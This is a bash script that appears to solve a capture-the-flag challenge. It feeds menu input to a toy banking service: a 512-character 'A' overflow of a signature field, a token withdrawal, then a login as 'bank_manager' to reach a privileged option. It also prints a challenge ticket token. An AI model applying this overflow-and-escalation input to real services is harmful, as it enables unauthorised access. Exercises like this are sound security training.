#!/bin/bash
echo "ticket{MittensLucky2166n25:lR4x9ASdEE1dR5PRhDxXSVscoybDZXuH9VmNF4fm835NJr1X}"
sleep 2

for _ in `seq 0 0`; do
  echo "random"
  sleep 0.6

  # Set signature
  echo "3"
  sleep 0.6
  python3 -c 'print("A"*512)'
  sleep 0.6

  # withdraw token
  echo "2"
  sleep 0.6
  echo "101"
  sleep 0.6
  echo "0.001"
  sleep 0.6

  # logout
  echo "4"
  sleep 1
done

echo "bank_manager"
sleep 0.6

echo "6"
sleep 0.6

cat /dev/tty
